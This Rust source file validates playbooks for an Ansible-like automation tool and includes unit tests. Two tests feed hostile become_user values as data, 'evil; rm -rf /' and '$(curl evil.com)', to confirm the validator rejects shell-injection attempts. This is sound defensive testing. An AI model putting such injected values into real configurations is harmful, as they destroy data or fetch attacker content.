//! Semantic validation that runs after serde-level parsing succeeds.
//!
//! Catches things serde can't:
//!   - empty plays (no tasks)
//!   - playbook `hosts:` lists referencing inventory names that don't exist
//!   - empty exec argv / shell command / write_file path
//!   - register / set_fact / loop_var names that aren't valid identifiers
//!
//! Template precompilation (`crate::template::precompile_all`) runs as a
//! separate pass driven from main.rs.

use crate::inventory::Inventory;
use crate::playbook::{HostSelector, Play, Playbook, SetFactMap, Task, TaskBody, TaskOp};
use anyhow::{anyhow, bail, Result};
use std::collections::BTreeSet;

pub fn validate(pb: &Playbook, inventory: Option<&Inventory>) -> Result<()> {
    if pb.plays.is_empty() {
        bail!("playbook has no plays");
    }
    for (i, play) in pb.plays.iter().enumerate() {
        validate_play(play, i, inventory)?;
    }
    Ok(())
}

fn validate_play(play: &Play, idx: usize, inv: Option<&Inventory>) -> Result<()> {
    let where_ = || format!("play[{idx}] {:?}", play.name);
    // After the role-flatten pass any `roles:` content has been moved into
    // `play.tasks`/`play.handlers`. So at validate time the test is just:
    // there must be at least one task body to run.
    if play.tasks.is_empty() {
        bail!("{}: no tasks (and no roles contributing tasks)", where_());
    }
    if let Some(u) = &play.become_user {
        if !is_valid_username(u) {
            bail!(
                "{}: become_user {:?} is not a valid POSIX username",
                where_(),
                u
            );
        }
    }
    let entries: Vec<&str> = match &play.hosts {
        HostSelector::All(_) => Vec::new(),
        HostSelector::Names(names) => {
            if names.is_empty() {
                bail!("{}: empty hosts list", where_());
            }
            names.iter().map(String::as_str).collect()
        }
        HostSelector::Name(n) => vec![n.as_str()],
    };
    // Validate the full hosts: expression against the pattern grammar.
    // Catches malformed regex, unbalanced brackets, leading `!`/`&`, etc.
    if !entries.is_empty() {
        let joined = entries.join(",");
        crate::host_pattern::HostPattern::parse(&joined).map_err(|e| {
            anyhow!("{}: invalid hosts pattern {:?}: {}", where_(), joined, e)
        })?;
    }
    if let Some(inv) = inv {
        for n in &entries {
            // For *plain-name* terms (no glob/regex metacharacters) we
            // can keep the pre-pattern-grammar typo-catching: if the
            // operator wrote a bare name that isn't in the inventory,
            // it's almost certainly a typo and silent-empty is bad UX.
            // Glob/regex terms are allowed to match nothing — same as
            // Ansible.
            if !crate::host_pattern::is_plain_name(n) {
                continue;
            }
            if !inv.hosts.contains_key(*n) && !inv.groups.contains_key(*n) {
                return Err(anyhow!(
                    "{}: {:?} is not a known host or group in the inventory",
                    where_(),
                    n
                ));
            }
        }
    }
    // Build the handler-name set first so task notify references can be
    // statically checked when they don't contain Jinja.
    let mut handler_names: BTreeSet<String> = BTreeSet::new();
    for (hi, h) in play.handlers.iter().enumerate() {
        if h.name.is_empty() {
            bail!("{}: handler[{hi}] has empty name", where_());
        }
        if !handler_names.insert(h.name.clone()) {
            bail!(
                "{}: handler[{hi}] {:?}: duplicate handler name (handlers are looked up by name)",
                where_(),
                h.name
            );
        }
        validate_handler(h, &where_(), hi)?;
    }
    // Track privkey-path → task-index for the play-scoped chain
    // constraint: an `openssl_csr_pipe` referencing a `privatekey_path`
    // must be preceded (in the same play) by an `openssl_privatekey`
    // task writing to that exact path. v1 doesn't support cross-run
    // chains via OpReadFile — flag this loudly so playbook errors
    // surface at validate time rather than as a confusing runtime
    // "no cached private key" failure.
    //
    // Paths containing Jinja (`{{ ... }}`) are unrendered at this
    // stage and can't be statically reasoned about — those skip the
    // check and rely on the runtime error.
    let mut privkey_paths: BTreeSet<String> = BTreeSet::new();
    for (ti, task) in play.tasks.iter().enumerate() {
        if task.name.is_empty() {
            bail!("{}: task[{ti}] has empty name", where_());
        }
        validate_task(task, &where_(), ti)?;
        if let TaskBody::Op(TaskOp::OpenSslPrivkey(p)) = &task.body {
            if !p.path.contains("{{") {
                privkey_paths.insert(p.path.clone());
            }
        }
        if let TaskBody::Op(TaskOp::OpenSslCsrPipe(c)) = &task.body {
            if !c.privatekey_path.contains("{{")
                && !privkey_paths.contains(&c.privatekey_path)
            {
                bail!(
                    "{}: task[{ti}] {:?}: openssl_csr_pipe.privatekey_path {:?} doesn't \
                     match any preceding openssl_privatekey task in this play. v1 requires \
                     the privkey and csr_pipe to chain within the same play (no cross-run \
                     OpReadFile fetch yet).",
                    where_(),
                    task.name,
                    c.privatekey_path
                );
            }
        }
        // Notify references: literal (no `{{`) names must match a handler.
        for n in &task.notify {
            if !n.contains("{{") && !handler_names.contains(n) {
                bail!(
                    "{}: task[{ti}] {:?}: notify {:?} doesn't match any handler in this play",
                    where_(),
                    task.name,
                    n
                );
            }
        }
    }
    Ok(())
}

fn validate_handler(h: &Task, where_: &str, hi: usize) -> Result<()> {
    if !h.notify.is_empty() {
        bail!(
            "{}: handler[{hi}] {:?}: handlers cannot notify other handlers (listen-chains not supported yet)",
            where_,
            h.name
        );
    }
    if matches!(h.body, TaskBody::ImportTasks(_)) {
        bail!(
            "{}: handler[{hi}] {:?}: import_tasks was not flattened; \
             call playbook::load() to resolve imports before validating",
            where_,
            h.name
        );
    }
    if matches!(h.body, TaskBody::IncludeRole(_)) {
        bail!(
            "{}: handler[{hi}] {:?}: include_role is not supported in handlers",
            where_,
            h.name
        );
    }
    // Reuse the task-shape checks (identifiers, op shape, etc).
    validate_task(h, where_, hi)
}

fn validate_task(task: &Task, where_: &str, ti: usize) -> Result<()> {
    // become_user: when set, must be a safe identifier — the orchestrator
    // splices it into a `sudo -n -u <user> --` argv unquoted, and an
    // attacker-controlled value with shell metacharacters could escape
    // the wrap. We require POSIX-ish usernames: [A-Za-z_][A-Za-z0-9_-]*
    // up to 32 chars (the conventional Linux limit).
    if let Some(u) = &task.become_user {
        if !is_valid_username(u) {
            bail!(
                "{}: task[{ti}] {:?}: become_user {:?} is not a valid POSIX username \
                 (allowed: [A-Za-z_][A-Za-z0-9_-]*, max 32 chars)",
                where_,
                task.name,
                u
            );
        }
    }
    if let Some(name) = &task.register {
        if !is_valid_identifier(name) {
            bail!(
                "{}: task[{ti}] {:?}: register name {:?} is not a valid identifier",
                where_,
                task.name,
                name
            );
        }
    }
    if let Some(lc) = &task.loop_control {
        if let Some(var) = &lc.loop_var {
            if !is_valid_identifier(var) {
                bail!(
                    "{}: task[{ti}] {:?}: loop_control.loop_var {:?} is not a valid identifier",
                    where_,
                    task.name,
                    var
                );
            }
        }
    }
    match &task.body {
        TaskBody::Op(op) => validate_op(op, task, where_, ti)?,
        TaskBody::SetFact(SetFactMap(m)) => {
            for k in m.keys() {
                if !is_valid_identifier(k) {
                    bail!(
                        "{}: task[{ti}] {:?}: set_fact key {:?} is not a valid identifier",
                        where_,
                        task.name,
                        k
                    );
                }
            }
        }
        TaskBody::Assert(a) => {
            if a.that.is_empty() {
                bail!(
                    "{}: task[{ti}] {:?}: assert.that is empty",
                    where_,
                    task.name
                );
            }
        }
        TaskBody::Fail(_) => {}
        TaskBody::Debug(_) => {}
        TaskBody::ImportTasks(p) => {
            // After load(), this shouldn't appear. Treat it as an error so a
            // caller that bypasses load() (parse + validate manually) sees a
            // clear message rather than running into "internal" in the
            // orchestrator.
            bail!(
                "{}: task[{ti}] {:?}: import_tasks({}) was not flattened; \
                 call playbook::load() to resolve imports before validating",
                where_,
                task.name,
                p.display()
            );
        }
        TaskBody::IncludeRole(ir) => {
            // After load(), this shouldn't appear either — the
            // role::expand_include_roles pass replaces it with the spliced
            // tasks. If it survives, the caller bypassed load().
            bail!(
                "{}: task[{ti}] {:?}: include_role({:?}, tasks_from={:?}) was not expanded; \
                 call playbook::load() before validating",
                where_,
                task.name,
                ir.name,
                ir.tasks_from
            );
        }
        TaskBody::Meta(_) => {
            // `meta: flush_handlers` is a bare control-flow marker. Reject
            // metadata that wouldn't make sense on it.
            if task.register.is_some() {
                bail!(
                    "{}: task[{ti}] {:?}: meta tasks can't carry `register:`",
                    where_,
                    task.name
                );
            }
            if !task.notify.is_empty() {
                bail!(
                    "{}: task[{ti}] {:?}: meta tasks can't carry `notify:`",
                    where_,
                    task.name
                );
            }
            if task.loop_spec.is_some() {
                bail!(
                    "{}: task[{ti}] {:?}: meta tasks can't carry `loop:`",
                    where_,
                    task.name
                );
            }
            if task.delegate_to.is_some() {
                bail!(
                    "{}: task[{ti}] {:?}: meta tasks can't carry `delegate_to:`",
                    where_,
                    task.name
                );
            }
            if task.run_once {
                bail!(
                    "{}: task[{ti}] {:?}: meta tasks can't carry `run_once:`",
                    where_,
                    task.name
                );
            }
        }
    }
    Ok(())
}

fn validate_op(op: &TaskOp, task: &Task, where_: &str, ti: usize) -> Result<()> {
    match op {
        TaskOp::Exec(e) if e.argv.is_empty() => {
            bail!("{}: task[{ti}] {:?}: exec.argv is empty", where_, task.name)
        }
        TaskOp::WriteFile(w) if w.path.is_empty() => {
            bail!(
                "{}: task[{ti}] {:?}: write_file.path is empty",
                where_,
                task.name
            )
        }
        TaskOp::Shell(s) if s.command().is_empty() => {
            bail!(
                "{}: task[{ti}] {:?}: shell command is empty",
                where_,
                task.name
            )
        }
        TaskOp::Template(t) => {
            if t.src.is_empty() {
                bail!(
                    "{}: task[{ti}] {:?}: template.src is empty",
                    where_,
                    task.name
                );
            }
            if t.dest.is_empty() {
                bail!(
                    "{}: task[{ti}] {:?}: template.dest is empty",
                    where_,
                    task.name
                );
            }
            // The body should have been populated by the role-flatten /
            // template-resolution pass run in `playbook::load`. A `None`
            // here means the caller bypassed load() or the file is missing.
            if t.body.is_none() {
                bail!(
                    "{}: task[{ti}] {:?}: template src {:?} was not resolved at load time; \
                     call playbook::load() or ensure the file exists",
                    where_,
                    task.name,
                    t.src
                );
            }
            Ok(())
        }
        TaskOp::Copy(c) => {
            if c.src.is_empty() {
                bail!(
                    "{}: task[{ti}] {:?}: copy.src is empty",
                    where_,
                    task.name
                );
            }
            if c.dest.is_empty() {
                bail!(
                    "{}: task[{ti}] {:?}: copy.dest is empty",
                    where_,
                    task.name
                );
            }
            if c.body.is_none() {
                bail!(
                    "{}: task[{ti}] {:?}: copy src {:?} was not resolved at load time; \
                     call playbook::load() or ensure the file exists",
                    where_,
                    task.name,
                    c.src
                );
            }
            Ok(())
        }
        TaskOp::GatherFacts => {
            // Implicit op — only the orchestrator constructs it. If we see
            // one here it means user YAML somehow produced one, which
            // shouldn't happen (no body-key surfaces it).
            bail!(
                "{}: task[{ti}] {:?}: gather_facts isn't a user-callable task body",
                where_,
                task.name
            )
        }
        TaskOp::Stat(s) => {
            if s.path.is_empty() {
                bail!(
                    "{}: task[{ti}] {:?}: stat.path is empty",
                    where_,
                    task.name
                );
            }
            Ok(())
        }
        TaskOp::WaitFor(w) => {
            // The Deserialize impl enforces mode mutual-exclusion, but
            // an in-code constructor could bypass it. Re-check here.
            let has_tcp = w.port.is_some();
            let has_path = w.path.is_some();
            if has_tcp && has_path {
                bail!(
                    "{}: task[{ti}] {:?}: wait_for: host+port and path are mutually exclusive",
                    where_,
                    task.name
                );
            }
            if !has_tcp && !has_path {
                bail!(
                    "{}: task[{ti}] {:?}: wait_for: must specify host+port OR path",
                    where_,
                    task.name
                );
            }
            if has_tcp {
                // Empty host with port set is meaningless — the agent
                // doesn't default to 127.0.0.1; require an explicit value.
                if w.host.as_deref().map(str::is_empty).unwrap_or(true) {
                    bail!(
                        "{}: task[{ti}] {:?}: wait_for: TCP mode requires a non-empty host",
                        where_,
                        task.name
                    );
                }
            }
            Ok(())
        }
        TaskOp::File(f) => {
            if f.path.is_empty() {
                bail!("{}: task[{ti}] {:?}: file.path is empty", where_, task.name);
            }
            // recurse only applies to directory state — warn the user by
            // failing validation rather than silently ignoring.
            if f.recurse && f.state != crate::playbook::FileState::Directory {
                bail!(
                    "{}: task[{ti}] {:?}: file.recurse only applies to state=directory",
                    where_,
                    task.name
                );
            }
            Ok(())
        }
        TaskOp::LineInFile(l) => {
            if l.path.is_empty() {
                bail!(
                    "{}: task[{ti}] {:?}: lineinfile.path is empty",
                    where_,
                    task.name
                );
            }
            if !l.insertbefore.is_empty() && !l.insertafter.is_empty() {
                bail!(
                    "{}: task[{ti}] {:?}: lineinfile: insertbefore and insertafter are mutually exclusive",
                    where_,
                    task.name
                );
            }
            if l.backrefs && l.regexp.is_empty() {
                bail!(
                    "{}: task[{ti}] {:?}: lineinfile.backrefs requires regexp",
                    where_,
                    task.name
                );
            }
            // Compile regexes to surface bad patterns at validate.
            if !l.regexp.is_empty() {
                regex::Regex::new(&l.regexp).map_err(|e| {
                    anyhow::anyhow!(
                        "{}: task[{ti}] {:?}: lineinfile.regexp: invalid pattern {:?}: {e}",
                        where_,
                        task.name,
                        l.regexp
                    )
                })?;
            }
            if !l.insertbefore.is_empty() {
                regex::Regex::new(&l.insertbefore).map_err(|e| {
                    anyhow::anyhow!(
                        "{}: task[{ti}] {:?}: lineinfile.insertbefore: invalid pattern {:?}: {e}",
                        where_,
                        task.name,
                        l.insertbefore
                    )
                })?;
            }
            if !l.insertafter.is_empty() && l.insertafter != "EOF" {
                regex::Regex::new(&l.insertafter).map_err(|e| {
                    anyhow::anyhow!(
                        "{}: task[{ti}] {:?}: lineinfile.insertafter: invalid pattern {:?}: {e}",
                        where_,
                        task.name,
                        l.insertafter
                    )
                })?;
            }
            Ok(())
        }
        TaskOp::Systemd(s) => {
            if s.name.trim().is_empty() {
                bail!(
                    "{}: task[{ti}] {:?}: systemd.name is empty",
                    where_,
                    task.name
                );
            }
            Ok(())
        }
        TaskOp::Package(p) => {
            let label = p.manager.label();
            if p.names.is_empty() {
                bail!(
                    "{}: task[{ti}] {:?}: {label}.name is empty",
                    where_,
                    task.name
                );
            }
            for n in &p.names {
                if n.trim().is_empty() {
                    bail!(
                        "{}: task[{ti}] {:?}: {label}.name contains an empty entry",
                        where_,
                        task.name
                    );
                }
            }
            Ok(())
        }
        TaskOp::Ufw(_) => {
            // Cross-field constraints already enforced at parse time;
            // nothing else to check.
            Ok(())
        }
        TaskOp::Uri(u) => {
            // url empty pre-render is a sure error — the rest of the
            // fields were already validated structurally at parse time
            // (status_codes range, body_format / method / follow_redirects
            // enum membership). Header-injection guard: forbid CR/LF in
            // header keys.
            if u.url.trim().is_empty() {
                bail!(
                    "{}: task[{ti}] {:?}: uri.url is empty",
                    where_,
                    task.name
                );
            }
            for k in u.headers.keys() {
                if k.is_empty() || k.contains('\r') || k.contains('\n') || k.contains(':') {
                    bail!(
                        "{}: task[{ti}] {:?}: uri.headers: invalid header name {:?} \
                         (must be non-empty and contain no CR/LF/colon)",
                        where_,
                        task.name,
                        k
                    );
                }
            }
            if u.status_codes.is_empty() {
                bail!(
                    "{}: task[{ti}] {:?}: uri.status_code: must be a non-empty list",
                    where_,
                    task.name
                );
            }
            Ok(())
        }
        TaskOp::BlockInFile(b) => {
            if b.path.is_empty() {
                bail!(
                    "{}: task[{ti}] {:?}: blockinfile.path is empty",
                    where_,
                    task.name
                );
            }
            if !b.insertbefore.is_empty() && !b.insertafter.is_empty() {
                bail!(
                    "{}: task[{ti}] {:?}: blockinfile: insertbefore and insertafter are mutually exclusive",
                    where_,
                    task.name
                );
            }
            if !b.marker.contains("{mark}") {
                bail!(
                    "{}: task[{ti}] {:?}: blockinfile.marker must contain the literal token `{{mark}}`",
                    where_,
                    task.name
                );
            }
            if !b.insertbefore.is_empty() {
                regex::Regex::new(&b.insertbefore).map_err(|e| {
                    anyhow::anyhow!(
                        "{}: task[{ti}] {:?}: blockinfile.insertbefore: invalid pattern {:?}: {e}",
                        where_,
                        task.name,
                        b.insertbefore
                    )
                })?;
            }
            if !b.insertafter.is_empty() && b.insertafter != "EOF" {
                regex::Regex::new(&b.insertafter).map_err(|e| {
                    anyhow::anyhow!(
                        "{}: task[{ti}] {:?}: blockinfile.insertafter: invalid pattern {:?}: {e}",
                        where_,
                        task.name,
                        b.insertafter
                    )
                })?;
            }
            Ok(())
        }
        TaskOp::OpenSslPrivkey(p) => {
            if p.path.is_empty() {
                bail!(
                    "{}: task[{ti}] {:?}: openssl_privatekey.path is empty",
                    where_,
                    task.name
                );
            }
            // size only meaningful for RSA; reject 0 / nonsense for RSA.
            if matches!(p.kind, crate::x509::PrivkeyType::Rsa)
                && !matches!(p.size, 2048 | 3072 | 4096)
            {
                bail!(
                    "{}: task[{ti}] {:?}: openssl_privatekey.size must be 2048, 3072, or 4096 \
                     for RSA; got {}",
                    where_,
                    task.name,
                    p.size
                );
            }
            Ok(())
        }
        TaskOp::OpenSslCsrPipe(c) => {
            if c.privatekey_path.is_empty() {
                bail!(
                    "{}: task[{ti}] {:?}: openssl_csr_pipe.privatekey_path is empty",
                    where_,
                    task.name
                );
            }
            if c.common_name.is_empty() {
                bail!(
                    "{}: task[{ti}] {:?}: openssl_csr_pipe.common_name is empty",
                    where_,
                    task.name
                );
            }
            // The `must run in same play as the privkey it derives from`
            // constraint is play-scoped, not task-scoped — checked in
            // `validate_play`. Per-task we just sanity-check the inputs.
            Ok(())
        }
        TaskOp::X509CertificatePipe(c) => {
            if c.provider != "selfsigned" {
                bail!(
                    "{}: task[{ti}] {:?}: x509_certificate_pipe.provider only supports \
                     \"selfsigned\" in v1; got {:?}",
                    where_,
                    task.name,
                    c.provider
                );
            }
            if c.valid_for_days == 0 {
                bail!(
                    "{}: task[{ti}] {:?}: x509_certificate_pipe.valid_for_days must be > 0",
                    where_,
                    task.name
                );
            }
            // csr_content / privatekey_content are almost always Jinja
            // expressions referencing prior registers; empty literals
            // are nonsense but valid expressions are opaque here.
            // Render-time evaluation catches empty cases.
            Ok(())
        }
        _ => Ok(()),
    }
}

/// POSIX-ish username: `[A-Za-z_][A-Za-z0-9_-]*`, max 32 chars
/// (conventional Linux limit). Differs from `is_valid_identifier`
/// in allowing `-` (common in service-account names like
/// `postgres-replica`).
fn is_valid_username(s: &str) -> bool {
    if s.is_empty() || s.len() > 32 {
        return false;
    }
    let mut chars = s.chars();
    match chars.next() {
        Some(c) if c.is_ascii_alphabetic() || c == '_' => {}
        _ => return false,
    }
    chars.all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-')
}

/// Python-ish identifier: `[A-Za-z_][A-Za-z0-9_]*`.
fn is_valid_identifier(s: &str) -> bool {
    let mut chars = s.chars();
    match chars.next() {
        Some(c) if c.is_ascii_alphabetic() || c == '_' => {}
        _ => return false,
    }
    chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn identifier_rules() {
        assert!(is_valid_identifier("ok"));
        assert!(is_valid_identifier("_x"));
        assert!(is_valid_identifier("a1"));
        assert!(!is_valid_identifier(""));
        assert!(!is_valid_identifier("1x"));
        assert!(!is_valid_identifier("with space"));
        assert!(!is_valid_identifier("dot.name"));
    }

    #[test]
    fn rejects_invalid_register_name() {
        let pb: Playbook = serde_yaml::from_str(
            r#"
- name: p
  tasks:
    - name: t
      register: "bad name"
      shell: echo
"#,
        )
        .unwrap();
        let err = validate(&pb, None).unwrap_err();
        let msg = format!("{err:#}");
        assert!(msg.contains("register"), "got: {msg}");
    }

    #[test]
    fn rejects_invalid_set_fact_key() {
        let pb: Playbook = serde_yaml::from_str(
            r#"
- name: p
  tasks:
    - name: t
      set_fact:
        "bad-key": 1
"#,
        )
        .unwrap();
        let err = validate(&pb, None).unwrap_err();
        let msg = format!("{err:#}");
        assert!(msg.contains("set_fact"), "got: {msg}");
    }

    #[test]
    fn rejects_unknown_handler_in_notify() {
        let pb: Playbook = serde_yaml::from_str(
            r#"
- name: p
  tasks:
    - name: t
      notify: nope
      shell: echo
"#,
        )
        .unwrap();
        let err = validate(&pb, None).unwrap_err();
        let msg = format!("{err:#}");
        assert!(msg.contains("notify") && msg.contains("nope"), "got: {msg}");
    }

    #[test]
    fn accepts_templated_notify_without_handler_match() {
        // `{{ ... }}` notify names are resolved at runtime; can't statically
        // verify, so the validator lets them through.
        let pb: Playbook = serde_yaml::from_str(
            r#"
- name: p
  tasks:
    - name: t
      notify: "{{ which_handler }}"
      shell: echo
"#,
        )
        .unwrap();
        validate(&pb, None).unwrap();
    }

    #[test]
    fn rejects_duplicate_handler_names() {
        let pb: Playbook = serde_yaml::from_str(
            r#"
- name: p
  tasks:
    - name: t
      shell: echo
  handlers:
    - name: dup
      shell: echo a
    - name: dup
      shell: echo b
"#,
        )
        .unwrap();
        let err = validate(&pb, None).unwrap_err();
        let msg = format!("{err:#}");
        assert!(msg.contains("duplicate") || msg.contains("dup"), "got: {msg}");
    }

    #[test]
    fn rejects_handler_with_notify() {
        let pb: Playbook = serde_yaml::from_str(
            r#"
- name: p
  tasks:
    - name: t
      shell: echo
  handlers:
    - name: chain_attempt
      notify: other_handler
      shell: echo
"#,
        )
        .unwrap();
        let err = validate(&pb, None).unwrap_err();
        let msg = format!("{err:#}");
        assert!(
            msg.contains("listen-chains") || msg.contains("notify"),
            "got: {msg}"
        );
    }

    #[test]
    fn accepts_valid_handler_chain() {
        let pb: Playbook = serde_yaml::from_str(
            r#"
- name: p
  tasks:
    - name: change_thing
      notify:
        - restart_sshd
        - log_change
      shell: echo
  handlers:
    - name: restart_sshd
      shell: echo restart
    - name: log_change
      shell: echo logged
"#,
        )
        .unwrap();
        validate(&pb, None).unwrap();
    }

    #[test]
    fn rejects_meta_with_register() {
        let pb: Playbook = serde_yaml::from_str(
            r#"
- name: p
  tasks:
    - name: drain
      register: r
      meta: flush_handlers
"#,
        )
        .unwrap();
        let err = validate(&pb, None).unwrap_err();
        let msg = format!("{err:#}");
        assert!(msg.contains("meta") && msg.contains("register"), "got: {msg}");
    }

    #[test]
    fn rejects_invalid_become_user_on_task() {
        let pb: Playbook = serde_yaml::from_str(
            r#"
- name: p
  tasks:
    - name: t
      become: true
      become_user: "evil; rm -rf /"
      shell: echo hi
"#,
        )
        .unwrap();
        let err = validate(&pb, None).unwrap_err();
        let msg = format!("{err:#}");
        assert!(
            msg.contains("become_user") && msg.contains("POSIX"),
            "got: {msg}"
        );
    }

    #[test]
    fn rejects_invalid_become_user_on_play() {
        let pb: Playbook = serde_yaml::from_str(
            r#"
- name: p
  become: true
  become_user: "$(curl evil.com)"
  tasks:
    - name: t
      shell: echo hi
"#,
        )
        .unwrap();
        let err = validate(&pb, None).unwrap_err();
        let msg = format!("{err:#}");
        assert!(msg.contains("become_user"), "got: {msg}");
    }

    #[test]
    fn accepts_normal_become_users() {
        let pb: Playbook = serde_yaml::from_str(
            r#"
- name: p
  become: true
  become_user: postgres
  tasks:
    - name: t
      shell: echo hi
    - name: u
      become_user: www-data
      shell: echo hi
"#,
        )
        .unwrap();
        validate(&pb, None).unwrap();
    }

    #[test]
    fn username_validator_accepts_realistic() {
        assert!(is_valid_username("root"));
        assert!(is_valid_username("postgres"));
        assert!(is_valid_username("www-data"));
        assert!(is_valid_username("_systemd-resolve"));
        assert!(is_valid_username("u1"));
        assert!(!is_valid_username(""));
        assert!(!is_valid_username("1abc"), "leading digit");
        assert!(!is_valid_username("a b"), "embedded space");
        assert!(!is_valid_username("a;b"), "shell metachar");
        assert!(!is_valid_username(&"a".repeat(33)), "too long");
    }

    #[test]
    fn rejects_stat_empty_path() {
        let pb: Playbook = serde_yaml::from_str(
            r#"
- name: p
  tasks:
    - name: probe
      stat:
        path: ""
"#,
        )
        .unwrap();
        let err = validate(&pb, None).unwrap_err();
        let msg = format!("{err:#}");
        assert!(msg.contains("stat.path") && msg.contains("empty"), "got: {msg}");
    }

    #[test]
    fn accepts_stat_with_path() {
        let pb: Playbook = serde_yaml::from_str(
            r#"
- name: p
  tasks:
    - name: probe
      stat:
        path: /etc/hostname
      register: probe_out
"#,
        )
        .unwrap();
        validate(&pb, None).expect("valid stat task");
    }

    #[test]
    fn rejects_file_empty_path() {
        let pb: Playbook = serde_yaml::from_str(
            r#"
- name: p
  tasks:
    - name: mkdir
      file:
        path: ""
        state: directory
"#,
        )
        .unwrap();
        let err = validate(&pb, None).unwrap_err();
        let msg = format!("{err:#}");
        assert!(msg.contains("file.path") && msg.contains("empty"), "got: {msg}");
    }

    #[test]
    fn rejects_recurse_on_non_directory() {
        let pb: Playbook = serde_yaml::from_str(
            r#"
- name: p
  tasks:
    - name: rm
      file:
        path: /tmp/x
        state: absent
        recurse: yes
"#,
        )
        .unwrap();
        let err = validate(&pb, None).unwrap_err();
        let msg = format!("{err:#}");
        assert!(msg.contains("recurse") && msg.contains("directory"), "got: {msg}");
    }

    #[test]
    fn accepts_file_directory_with_owner() {
        let pb: Playbook = serde_yaml::from_str(
            r#"
- name: p
  tasks:
    - name: mk
      file:
        path: /opt/foo
        state: directory
        owner: root
        group: root
        mode: "0755"
"#,
        )
        .unwrap();
        validate(&pb, None).expect("valid file task");
    }

    #[test]
    fn rejects_csr_pipe_without_preceding_privkey() {
        let pb: Playbook = serde_yaml::from_str(
            r#"
- name: p
  tasks:
    - name: csr
      openssl_csr_pipe:
        privatekey_path: /etc/etcd/server.key
        common_name: cn
"#,
        )
        .unwrap();
        let err = validate(&pb, None).unwrap_err();
        let msg = format!("{err:#}");
        assert!(
            msg.contains("openssl_csr_pipe") && msg.contains("preceding"),
            "got: {msg}"
        );
    }

    #[test]
    fn accepts_csr_pipe_after_privkey() {
        let pb: Playbook = serde_yaml::from_str(
            r#"
- name: p
  tasks:
    - name: key
      openssl_privatekey:
        path: /etc/etcd/server.key
    - name: csr
      openssl_csr_pipe:
        privatekey_path: /etc/etcd/server.key
        common_name: cn
"#,
        )
        .unwrap();
        validate(&pb, None).expect("chained ok");
    }

    #[test]
    fn rejects_x509_pipe_provider_other_than_selfsigned() {
        // The provider check is enforced at Deserialize time (more
        // immediate UX than waiting for validate). Confirm parsing
        // rejects the bad value before validate even runs.
        let err = serde_yaml::from_str::<Playbook>(
            r#"
- name: p
  tasks:
    - name: cert
      x509_certificate_pipe:
        csr_content: x
        privatekey_content: y
        provider: ownca
"#,
        )
        .unwrap_err();
        let msg = format!("{err:#}");
        assert!(msg.contains("provider") || msg.contains("selfsigned"), "got: {msg}");
    }

    #[test]
    fn rejects_privkey_invalid_rsa_size() {
        let pb: Playbook = serde_yaml::from_str(
            r#"
- name: p
  tasks:
    - name: t
      openssl_privatekey:
        path: /etc/k
        size: 1024
"#,
        )
        .unwrap();
        let err = validate(&pb, None).unwrap_err();
        let msg = format!("{err:#}");
        assert!(msg.contains("size") || msg.contains("2048"), "got: {msg}");
    }

    #[test]
    fn rejects_unflattened_import_tasks() {
        let pb: Playbook = serde_yaml::from_str(
            r#"
- name: p
  tasks:
    - name: t
      import_tasks: somewhere.yml
"#,
        )
        .unwrap();
        let err = validate(&pb, None).unwrap_err();
        let msg = format!("{err:#}");
        assert!(msg.contains("import_tasks") || msg.contains("flattened"), "got: {msg}");
    }
}
